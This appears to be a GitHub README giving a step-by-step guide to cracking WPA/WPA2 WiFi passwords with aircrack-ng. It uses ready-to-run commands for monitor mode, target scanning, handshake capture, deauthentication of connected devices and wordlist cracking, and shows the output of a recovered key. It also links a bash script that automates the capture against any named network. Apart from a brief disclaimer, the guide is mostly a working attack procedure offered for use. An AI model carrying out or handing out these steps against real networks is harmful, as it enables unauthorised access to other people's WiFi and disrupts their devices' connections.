cracking WPA/WPA2 secured WiFi networks with the aircrack-ng suite

> <picture>
>   <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Mqxx/GitHub-Markdown/main/blockquotes/badge/light-theme/warning.svg">
>   <img alt="Warning" src="https://raw.githubusercontent.com/Mqxx/GitHub-Markdown/main/blockquotes/badge/dark-theme/warning.svg">
> </picture><br>
> This guide is for educational purposes only and should not be used for any illegal activities. The author and publisher is not liable for any illegal use.

## Requirements

-   [Kali Linux](https://www.kali.org/get-kali)
-   [aircrack-ng suite](https://www.aircrack-ng.org) (pre-installed on Kali Linux)
-   external WiFi adapter with [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode) and packet injection capabilities ([PiAEK AC-1200 mpbs](https://www.amazon.de/PiAEK-Adapter-Wireless-Verl%C3%A4ngerungskabel-Unterst%C3%BCtzung/dp/B08BHY92R4) used in this guide)
-   drivers for the external WiFi adapter ([rtl8812au](https://github.com/aircrack-ng/rtl8812au) used in this guide)
-   run `sudo su` in the shell to stay in root mode and not have to run every command with `sudo`

## Walkthrough

### Enable monitor mode

[Monitor mode](https://en.wikipedia.org/wiki/Monitor_mode) allows the WiFi adapter to capture all WiFi packages in the air. Before enabling monitor mode, make sure the WiFi adapter is connected to the system. Check that, by running `iwconfig`. The adapter should be listed with a name like `wlan0` or `wlan1`:

```bash
wlan0     unassociated  ESSID:""  Nickname:"<WIFI@REALTEK>"
          Mode:Managed  Frequency=2.412 GHz  Access Point: Not-Associated
          Sensitivity:0/0
          Retry:off   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality:0  Signal level:0  Noise level:0
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
```

To enable monitor mode, we first need to stop processes that might interfere with the adapter:

```bash
sudo airmon-ng check kill
```

Next, we can enable monitor mode on the adapter:

```bash
sudo airmon-ng start wlan0 # replace wlan0 with the name of your adapter
```

### Look for target network

To find the target network, we can use `airodump-ng`, which is a tool from the _aircrack-ng_ suite. This tool lists all WiFi networks in the area, including their BSSID, ESSID, channel, etc.:

```bash
airodump-ng wlan0 # replace wlan0 with the name of your adapter (your adapter might have a different name after enabling monitor mode, to check run iwconfig)
```

```
CH  0 ][ Elapsed: 0 s ][ 2024-04-18 18:55

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

AA:AB:AC:AD:AE:AF  -99        5        0    0   1  100   WPA2 CCMP   PSK  myhomenetwork
```

write down the BSSID and channel of the target network.

### Capture handshake

When a device connects to a WiFi network, a so-called [handshake](https://medium.com/@hackersprey/wifi-handshake-cf1f3397a5cc) is exchanged between the device and the access point. This handshake can be captured and used to crack the WiFi password. To capture the handshake, we need to run `airodump-ng` again, but this time we need to specify the BSSID and channel of the target network:

```bash
airodump-ng -d AA:AB:AC:AD:AE:AF -c 1 --write handshake wlan0 # replace AA:AB:AC:AD:AE:AF with the BSSID of the target network, 1 with the channel of the target network and wlan0 with the name of your adapter
```

this command starts listening for the handshake. Once a device connects to the target network, the handshake will be captured and saved to a file called `handshake-01.cap`. An indicator will show when the handshake is captured; it will appear on the first line after the date and time (you can safely stop the process with `Ctrl + C` after the handshake was captured):

```
CH  0 ][ Elapsed: 0 s ][ 2024-04-18 18:55 ][ WPA handshake: AA:AB:AC:AD:AE:AF
```

Optionally, you can speed up the process by deauthenticating all device currently connected to the target network and forcing them to reconnect and establish a new handshake:

```bash
# --deauth specifies the number of deauthentications to send (5 in this case)
aireplay-ng --deauth 5 -a AA:AB:AC:AD:AE:AF wlan0 # replace AA:AB:AC:AD:AE:AF with the BSSID of the target network and wlan0 with the name of your adapter
```

### Crack the password

To crack the password, we need to use a wordlist. A wordlist is a list of possible passwords that will be tried one by one until the correct password is found. In this guide, we will use the `rockyou.txt` wordlist, which is a popular wordlist that comes pre-installed on Kali Linux. To crack the password, we need to run `aircrack-ng` and specify the wordlist and the captured handshake:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
```

```
                               Aircrack-ng 1.7

      [00:00:08] 40629/14344392 keys tested (4797.50 k/s)

      Time left: 49 minutes, 41 seconds                          0.28%

                           KEY FOUND! [ test1234 ]


      Master Key     : 8F 5D 7E B8 B7 72 54 75 43 E7 BE 33 66 36 DC C6
                       C6 99 AB 2B E6 5D C6 C1 40 B8 BD 66 52 A6 4A F4

      Transient Key  : 32 2B 40 BA 56 02 E0 2D E9 25 B4 89 AE D8 58 5A
                       08 73 1D 09 BD AE 94 B7 ED 14 9F BE 58 B5 30 85
                       65 C1 ED 9C C9 33 08 DA 83 84 99 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : B7 D9 4F 14 7A 29 6F 3E B3 5C F8 E5 C0 F8 E1 EF
```

And Voila! The password was cracked in only **8 seconds** after testing **40629** other passwords. In this case, the password was `test1234`.

## Script automation

Because the process of capturing the handshake is always the same and can be quite tedious, I've automated the process with a simple [bash script](dump.sh). It takes two parameters:

1. (required) the name of the target network
1. (optional) the name of the adapter - default: wlan0

it does all the steps until capturing the handshake and throws you directly into the _airodump-ng_ target network sniff. You only have to wait for the handshake to be captured and then run the _aircrack-ng_ command to crack the password.

<br><br>

_credits to:_

> [The Morpheus Tutorials](https://youtu.be/GLmpLeghM2Y?si=t45liQwGh7E92Oib)
